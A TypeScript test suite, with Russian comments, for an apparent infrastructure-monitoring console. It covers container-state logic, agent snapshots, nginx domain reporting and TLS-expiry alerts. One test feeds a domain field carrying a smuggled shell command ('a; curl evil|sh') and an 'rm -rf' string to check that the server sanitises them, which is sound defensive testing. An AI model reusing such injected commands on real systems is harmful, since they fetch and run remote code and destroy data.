/**
 * Полнота инвентаря (агент 1.5): контейнеры всех compose-проектов хоста и домены из конфигурации nginx — чистая
 * логика и сквозной путь «отчёт → таблица → алерт → /infra/domains».
 */
import { beforeAll, describe, expect, it } from 'vitest'
import { api, freshApp, login, report, signedAgentRequest } from './helpers'
import { getDb } from '../server/db/client'
import { tlsChecks } from '../server/db/schema'
import { isContainerDown } from '../shared/container-state'
import { agentReportSchema } from '../shared/agent-contract'
import { isMainStack, storedSnapshot } from '../server/agents/ingest'
import { lastStateLine } from '../server/agents/silence'
import { groupByProject } from '../web/lib/host'
import { agentDomainStatus, mergeDomains, worseStatus } from '../web/lib/domains'
import { sendsDomains } from '../web/pages/infra/DomainsNote'
import type { AgentDomain, Alert, TlsCert } from '../web/lib/types'

const DAY = 86_400

describe('контейнеры соседних стеков', () => {
  const down = (state: string, restartPolicy: string, exitCode: number | null, mainStack?: boolean) =>
    isContainerDown({ state, restartPolicy, exitCode, mainStack })

  it('стек продукта: любая остановка, кроме штатно завершённой одноразовой задачи', () => {
    expect(down('exited', 'unless-stopped', 137)).toBe(true)
    expect(down('exited', 'no', 0)).toBe(false)
    expect(down('exited', 'no', 1, true)).toBe(true)
    expect(down('restarting', 'always', null, true)).toBe(true)
  })

  it('соседний стек: остановлен руками или разовый — не сбой; on-failure с ошибкой, dead и цикл — сбой', () => {
    expect(down('exited', 'unless-stopped', 137, false)).toBe(false)
    expect(down('exited', 'always', 143, false)).toBe(false)
    expect(down('exited', 'no', 1, false)).toBe(false)
    expect(down('exited', 'on-failure', 1, false)).toBe(true)
    expect(down('exited', 'on-failure', 143, false)).toBe(false)
    expect(down('dead', 'no', null, false)).toBe(true)
    expect(down('restarting', 'always', null, false)).toBe(true)
  })

  it('основной проект: без OPS_COMPOSE_PROJECT основным считается всё (как до 1.5)', () => {
    expect(isMainStack({ mainProject: 'backend' }, { composeProject: 'backend' })).toBe(true)
    expect(isMainStack({ mainProject: 'backend' }, { composeProject: 'neighbour' })).toBe(false)
    expect(isMainStack({ mainProject: 'backend' }, { composeProject: '' })).toBe(false)
    expect(isMainStack({}, { composeProject: 'neighbour' })).toBe(true)
  })

  it('группы на странице хоста: стек продукта первым, «без compose» последним', () => {
    const groups = groupByProject([
      { name: 'x', composeProject: '', mainStack: false },
      { name: 'b', composeProject: 'neighbour', mainStack: false },
      { name: 'a', composeProject: 'backend', mainStack: true },
      { name: 'c', composeProject: 'aiboards', mainStack: false },
      { name: 'a2', composeProject: 'backend', mainStack: true },
    ])
    expect(groups.map((g) => [g.project, g.containers.length])).toEqual([
      ['backend', 2],
      ['aiboards', 1],
      ['neighbour', 1],
      ['', 1],
    ])
  })
})

describe('снимок агента', () => {
  const parsed = agentReportSchema.parse(
    report(
      [
        { name: 'api', state: 'running' },
        { name: 'old', state: 'exited' },
      ],
      {
        agentVersion: '1.5.0',
        mainProject: 'backend',
        domains: [{ name: 'a.example', tls: true }],
        domainsAt: 1,
        domainsTotal: 1,
        domainsFailed: ['edge-nginx'],
        commandResults: [],
      },
    ),
  )

  it('хранит только известные поля: без списков контейнеров и доменов, со счётчиками', () => {
    const snap = storedSnapshot(parsed)
    expect(snap).not.toHaveProperty('containers')
    expect(snap).not.toHaveProperty('domains')
    expect(snap).not.toHaveProperty('commandResults')
    expect(snap).toMatchObject({ mainProject: 'backend', domainsFailed: ['edge-nginx'], containerCounts: { running: 1, total: 2 } })
  })

  it('строка последнего состояния — по счётчикам нового снимка и по списку старого', () => {
    expect(lastStateLine(JSON.stringify({ containerCounts: { running: 3, total: 5 } }))).toBe('контейнеров 3/5')
    expect(lastStateLine(JSON.stringify({ containers: [{ state: 'running' }, { state: 'exited' }] }))).toBe('контейнеров 1/2')
  })
})

describe('домены в интерфейсе', () => {
  const now = Date.now()
  const hosted = (over: Partial<AgentDomain> = {}): AgentDomain => ({
    agentId: 'vps',
    agentName: 'vps',
    domain: 'a.example',
    source: 'nginx',
    port: 443,
    tls: true,
    issuer: "Let's Encrypt",
    validTo: now + 60 * DAY * 1000,
    daysLeft: 60,
    error: null,
    checkedAt: now,
    stale: false,
    updatedAt: now,
    ...over,
  })
  const cert = (over: Partial<TlsCert> = {}) =>
    ({ domain: 'a.example', issuer: 'R3', validTo: null, daysLeft: 50, error: null, checkedAt: now, ...over }) as TlsCert

  it('агент 1.5 и старше присылает домены', () => {
    expect(sendsDomains('1.5.0')).toBe(true)
    expect(sendsDomains('2.0')).toBe(true)
    expect(sendsDomains('1.4.9')).toBe(false)
    expect(sendsDomains(undefined)).toBe(false)
  })

  it('состояние: ошибка сертификата — критично, мягкая — предупреждение, без TLS — неизвестно', () => {
    expect(agentDomainStatus(hosted({ error: 'expired' }))).toBe('critical')
    expect(agentDomainStatus(hosted({ error: 'untrusted' }))).toBe('warning')
    expect(agentDomainStatus(hosted({ checkedAt: null, daysLeft: null }))).toBe('pending')
    expect(agentDomainStatus(hosted({ tls: false }))).toBe('unknown')
    expect(agentDomainStatus(hosted({ daysLeft: 5 }))).toBe('critical')
    expect(worseStatus('unknown', 'healthy')).toBe('healthy')
    expect(worseStatus('warning', 'critical')).toBe('critical')
    expect(worseStatus('pending', 'unknown')).toBe('pending')
  })

  it('одна строка на имя из двух источников: худшее состояние и подпись его источника, алерты по отпечатку', () => {
    const firing = [{ fingerprint: 'rule:7:tls:a.example' } as Alert, { fingerprint: 'rule:7:tls:other.example' } as Alert]
    const views = mergeDomains(
      [cert({ domain: 'A.example' })],
      [hosted({ error: 'name_mismatch' }), hosted({ domain: 'b.example', tls: false })],
      firing,
    )
    expect(views).toHaveLength(2)
    const a = views.find((v) => v.domain === 'a.example')!
    expect(a).toMatchObject({ status: 'critical', problem: 'сертификат на другое имя', tls: true })
    expect(a.external).not.toBeNull()
    expect(a.hosts).toHaveLength(1)
    expect(a.issues).toHaveLength(1)
    expect(views.find((v) => v.domain === 'b.example')).toMatchObject({ status: 'unknown', tls: false })
  })
})

describe('домены nginx: отчёт → таблица → алерт (сквозной)', () => {
  let app: Awaited<ReturnType<typeof freshApp>>
  let owner: ReturnType<typeof api>
  let secret = ''
  const send = (body: unknown) => app.request('/api/agent/report', signedAgentRequest('edge', secret, body))
  const ctr = (name: string, over: Record<string, unknown> = {}) => ({
    name,
    image: 'nginx:1.27',
    state: 'running',
    health: 'none',
    status: 'Up',
    restartCount: 0,
    composeService: name,
    composeProject: 'backend',
    restartPolicy: 'unless-stopped',
    ...over,
  })
  const at = (days: number) => Math.floor(Date.now() / 1000) + days * DAY
  const base = (domains: unknown[] | undefined, extra: Record<string, unknown> = {}) =>
    report([ctr('nginx'), ctr('neighbour-tls', { composeProject: 'neighbour', restartable: false })], {
      agentVersion: '1.5.0',
      mainProject: 'backend',
      ...(domains ? { domains, domainsAt: Math.floor(Date.now() / 1000), domainsTotal: domains.length } : {}),
      ...extra,
    })
  const tlsAlerts = async () =>
    ((await owner.get('/alerts?status=firing')).json.alerts as Alert[])
      .filter((a) => a.fingerprint.includes(':tls:'))
      .map((a) => a.fingerprint)

  beforeAll(async () => {
    app = await freshApp()
    owner = api(app, await login(app))
    const created = await owner.post('/admin/agents', { id: 'edge', name: 'edge', environment: 'production' })
    secret = created.json.secret
  })

  it('домены приходят в таблицу; срок без внешнего монитора поднимает алерт tls_expiry', async () => {
    await getDb()
      .insert(tlsChecks)
      .values({ domain: 'watched.example', daysLeft: 2, validTo: new Date(at(2) * 1000), checkedAt: new Date() })
    const res = await send(
      base([
        { name: 'Soon.example', source: 'nginx', port: 443, tls: true, validTo: at(2), issuer: 'R3', checkedAt: at(0) },
        { name: 'ok.example', source: 'nginx', port: 443, tls: true, validTo: at(80), issuer: 'R3', checkedAt: at(0) },
        { name: 'watched.example', source: 'nginx', port: 443, tls: true, validTo: at(1), checkedAt: at(0) },
        { name: 'plain.example', source: 'nginx', port: 80, tls: false },
        { name: 'soon.example', source: 'other', tls: true },
      ]),
    )
    expect(res.status).toBe(200)
    const { domains } = (await owner.get('/infra/domains')).json as { domains: AgentDomain[] }
    expect(domains.map((d) => d.domain)).toEqual(['ok.example', 'plain.example', 'soon.example', 'watched.example'])
    expect(domains.find((d) => d.domain === 'soon.example')).toMatchObject({ agentName: 'edge', source: 'nginx', daysLeft: 1, tls: true })
    const fps = await tlsAlerts()
    // Внешняя проверка свежая — её домен агентский замер не трогает; второй алерт по нему не открывается.
    expect(fps.some((f) => f.endsWith(':tls:soon.example'))).toBe(true)
    expect(fps.some((f) => f.endsWith(':tls:watched.example'))).toBe(false)
    expect(fps.some((f) => f.endsWith(':tls:ok.example'))).toBe(false)
  })

  it('отчёт без поля domains список не трогает; отказ nginx -T виден в снимке', async () => {
    await send(base(undefined, { domainsFailed: ['edge-nginx'] }))
    expect((await owner.get('/infra/domains')).json.domains).toHaveLength(4)
    const agents = (await owner.get('/infra/agents')).json.agents as Array<{ id: string; snapshot: Record<string, unknown> }>
    expect(agents.find((a) => a.id === 'edge')?.snapshot.domainsFailed).toEqual(['edge-nginx'])
  })

  it('домен пропал из конфигурации — строка удаляется, его алерт закрывается', async () => {
    await send(base([{ name: 'ok.example', source: 'nginx', port: 443, tls: true, validTo: at(80), checkedAt: at(0) }]))
    expect(((await owner.get('/infra/domains')).json.domains as AgentDomain[]).map((d) => d.domain)).toEqual(['ok.example'])
    expect((await tlsAlerts()).some((f) => f.endsWith(':tls:soon.example'))).toBe(false)
    await send(base([]))
    expect((await owner.get('/infra/domains')).json.domains).toHaveLength(0)
  })

  it('срок недоверенного сертификата и обрезанный список алерт не закрывают; поля подсказки — только в своей форме', async () => {
    const soon = { name: 'soon.example', source: 'nginx', port: 443, tls: true, validTo: at(2), checkedAt: at(0) }
    await send(base([soon]))
    const firing = async () => (await tlsAlerts()).some((f) => f.endsWith(':tls:soon.example'))
    expect(await firing()).toBe(true)
    // Соседний nginx отдаёт под тем же именем самоподписанный сертификат до 2099 — это не продление.
    for (let i = 0; i < 3; i++) await send(base([{ ...soon, source: 'a-proxy', validTo: at(27_000), error: 'untrusted' }]))
    expect(await firing()).toBe(true)
    // Агент нашёл больше имён, чем прислал: отсутствующее имя обрезано, а не пропало из nginx.
    for (let i = 0; i < 3; i++) await send(base([{ name: 'ok.example', tls: false }], { domainsTotal: 150 }))
    expect(await firing()).toBe(true)
    expect(((await owner.get('/infra/domains')).json.domains as AgentDomain[]).map((d) => d.domain)).toEqual(['ok.example', 'soon.example'])
    await send(
      base([
        { name: 'x.example', source: 'a; curl evil|sh', tls: false, error: 'rm -rf' },
        { name: 'bad name!', tls: false },
      ]),
    )
    const { domains } = (await owner.get('/infra/domains')).json as { domains: AgentDomain[] }
    expect(domains.map((d) => [d.domain, d.source, d.error])).toEqual([['x.example', '', 'verify_failed']])
  })

  it('перезапуск контейнера, который хост не перезапускает, консоль не ставит в очередь', async () => {
    const res = await owner.post('/infra/agents/edge/containers/neighbour-tls/restart', { reason: 'проверка запрета' })
    expect(res.status).toBe(403)
    expect(String(res.json.error ?? res.json.message ?? '')).toContain('neighbour')
  })
})
